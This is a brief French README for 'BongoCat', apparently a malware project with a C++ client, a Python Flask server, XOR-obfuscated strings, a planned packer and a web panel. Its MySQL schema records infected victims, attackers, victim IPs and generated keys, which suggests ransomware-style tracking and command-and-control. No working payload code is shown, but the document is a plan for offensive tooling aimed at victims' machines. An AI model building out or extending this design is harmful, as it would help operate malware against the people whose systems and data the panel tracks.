# BongoCat

Explication:

- Client-Side en C++

- Server-Side en Python

- Chiffrement XOR des strings

- Supporte HTTP

- Pannel web

---

HTTPRequest doc:
https://github.com/elnormous/HTTPRequest/blob/master/include/HTTPRequest.hpp

Serv documentation:
https://flask-fr.readthedocs.io

---

Panel pour le serv:

- Stats: cle generer, webhooks, identification par UiD
- Bdd: MySQL

Bdd setup:

CREATE TABLE `bongocat`.`infected` (
  `attaquant` INT NULL,
  `victime` INT NULL,
  `ip` VARCHAR(45) NULL,
  `key` VARCHAR(45) NULL)
COMMENT = 'We ak like cats';

CREATE TABLE `bongocat`.`keygen` (
  `IP` VARCHAR(45) NULL,
  `KEY` VARCHAR(300) NULL)
COMMENT = 'Brrr my cat love this';

CREATE TABLE `bongocat`.`users` (
  `key` VARCHAR(15) NOT NULL,
  `username` VARCHAR(45) NULL,
  `password` VARCHAR(45) NULL,
  PRIMARY KEY (`key`));

---

Schema:

https://excalidraw.com/#json=StbhrVrzyJxBmejtiWBDD,qwhrQeOd_YlXy35reteTJQ


---

BongoCat packer:

A FAIRE
